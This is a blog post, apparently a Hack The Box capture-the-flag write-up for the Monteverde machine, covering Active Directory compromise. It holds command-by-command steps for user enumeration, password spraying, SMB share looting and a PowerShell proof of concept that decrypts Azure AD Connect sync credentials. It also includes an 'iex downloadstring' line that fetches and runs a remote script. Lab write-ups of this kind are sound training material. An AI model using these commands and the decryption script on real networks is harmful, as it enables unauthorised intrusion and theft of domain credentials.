---
title: "Exploiting Azure AD Connect: From Password Spray to Domain Admin"
date: 2026-03-17
description: "A deep dive into HTB Monteverde, demonstrating how to extract and decrypt credentials from the Azure AD Sync database."
summary: "Azure AD Connect is a powerful tool, but in the hands of an attacker, it's a direct path to Domain Admin. Learn how to weaponize Azure Admin privileges."
tags: ["Red Team", "Active Directory", "Azure AD", "HTB", "Privilege Escalation"]
categories: ["Offensive Operations"]
series: ["Active Directory Exploitation"]
image: "featured.jpg"
showTableOfContents: true
draft: false
---

HTB: Monteverde - Cracking Azure AD Sync
========================================

**Target IP:** 10.10.10.172**Focus:** Active Directory, Password Spraying, Azure AD Connect Decryption

This box is a great reminder that in a Windows environment, you don't always need a fancy web exploit to get in. Sometimes, the front door is open, and the keys to the kingdom are sitting in a config file.

Phase 1: Fingerprinting the Domain Controller
---------------------------------------------

We start with a full port sweep. On a Windows target, I’m looking for the "Big Five": DNS, Kerberos, LDAP, SMB, and WinRM.

### Nmap Discovery

Bash

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.172   `

The scan returns 19 open ports. The ones that matter for our initial foothold are:

*   **53/tcp (DNS)**
    
*   **88/tcp (Kerberos)**
    
*   **389/tcp (LDAP)**
    
*   **445/tcp (SMB)**
    
*   **5985/tcp (WinRM)**
    

This confirms we are looking at a Domain Controller for MEGABANK.LOCAL. Since there’s no web server (port 80/443), our attack surface is strictly focused on AD services.

Phase 2: Harvesting Usernames via RPC
-------------------------------------

SMB guest access was a bust, so I moved to **RPC (port 135/445)**. If the configuration is loose, a null session (no credentials) can leak the entire user list.

### The RPC Connection

Bash

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   root@kali# rpcclient -U "" -N 10.10.10.172  rpcclient $> querydispinfo   `

The server leaked several interesting accounts:

*   AAD\_987d7f2f57d2 (A service account for Azure Synchronization)
    
*   dgalanos
    
*   mhope (Mike Hope)
    
*   SABatchJobs
    
*   smorgan
    
*   svc-ata, svc-bexec, svc-netapp
    

Phase 3: The First Foothold (Password Spraying)
-----------------------------------------------

With a solid list of usernames, the next logical step is a **Password Spray**. In many AD setups, new accounts are created with a default password equal to the username.

### CrackMapExec Spray

I put the usernames in a file and let crackmapexec do the heavy lifting:

Bash

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   root@kali# crackmapexec smb 10.10.10.172 -u users -p users --continue-on-success   `

**Result:** \[+\] MEGABANK.LOCAL\\SABatchJobs:SABatchJobs

We have a match. This isn't a "hack" in the movie sense—it's just exploiting human laziness.

Phase 4: Lateral Movement (The Azure Leak)
------------------------------------------

Now that I have a valid session as SABatchJobs, I revisited the SMB shares to see what a "batch jobs" user can see.

### Share Enumeration

Bash

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   root@kali# smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R 'users$'   `

In the users$ share, specifically under \\mhope\\, I found a very interesting file: azure.xml.

### Exfiltrating the XML

Bash

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   root@kali# smbclient -U SABatchJobs //10.10.10.172/users$ -c 'get mhope/azure.xml azure.xml'   `

Checking the content of azure.xml:

XML

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML            `4n0therD4y@n0th3r$`      

We just found Mike Hope’s password: **4n0therD4y@n0th3r$**.

### Shell as mhope

I verified these credentials over WinRM (port 5985):

Bash

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   root@kali# crackmapexec winrm 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'  WINRM   10.10.10.172   5985   MONTEVERDE   [+] MEGABANK\mhope:4n0therD4y@n0th3r$ (Pwn3d!)   `

Using Evil-WinRM, I logged in and grabbed the user flag from C:\\Users\\mhope\\desktop\\user.txt.

Phase 5: Privilege Escalation (Azure AD Sync Exploit)
-----------------------------------------------------

I started by checking mhope's permissions. He belongs to a very powerful group: **Azure Admins**.

### The Vulnerability

The server is running **Microsoft Azure AD Connect**. This service needs to replicate AD data to the cloud, so it stores credentials for a synchronization account in a local SQL database called ADSync.

As an **Azure Admin**, mhope can read this database. The goal is to pull the encrypted password and decrypt it using the built-in Azure libraries.

### The Decryption Script

I used a PowerShell POC that performs these steps:

1.  Connects to the local SQL instance.
    
2.  Extracts keyset\_id, instance\_id, and entropy from the mms\_server\_configuration table.
    
3.  Extracts the encrypted\_configuration from the mms\_management\_agent table.
    
4.  Uses C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll to perform the decryption.
    

PowerShell

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"  $client.Open()  # [Fetch Key Info]  $cmd = $client.CreateCommand()  $cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"  $reader = $cmd.ExecuteReader()  # ... (reader logic) ...  # [Fetch Config & Encrypted Creds]  $cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"  # ... (reader logic) ...  # [Decryption logic using mcrypt.dll]  add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'  $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager  $km.LoadKeySet($entropy, $instance_id, $key_id)  # ... (decryption calls) ...   `

### Execution

Running the script on the target:

PowerShell

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   *Evil-WinRM* PS C:\> iex(new-object net.webclient).downloadstring('http://10.10.14.11/Get-MSOLCredentials.ps1')  Domain: MEGABANK.LOCAL  Username: administrator  Password: d0m@in4dminyeah!   `

It turns out that on this box, the administrator account itself was used for the sync service.

### Final Flag

I used the newly found password to log in as the Domain Admin:

Bash

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   root@kali# evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'   `

**Root flag located at:** C:\\Users\\Administrator\\desktop\\root.txt.

Technical Appendix: Why the "v2" POC Fails
------------------------------------------

During my research, I found an updated version (v2) of the exploit that uses xp\_cmdshell to execute code as the SQL service account. However, on Monteverde, this failed with the following error:User does not have permission to perform this action.

**The Breakdown:**

*   **Permissions:** Even though we are "Azure Admins," we are not **SQL SysAdmins**. The RECONFIGURE statement required to enable xp\_cmdshell is restricted.
    
*   **Why v1 worked:** The first method works because it doesn't try to change SQL settings. It simply reads the data (which we have permissions for) and uses the local DLL to decrypt it within our own session.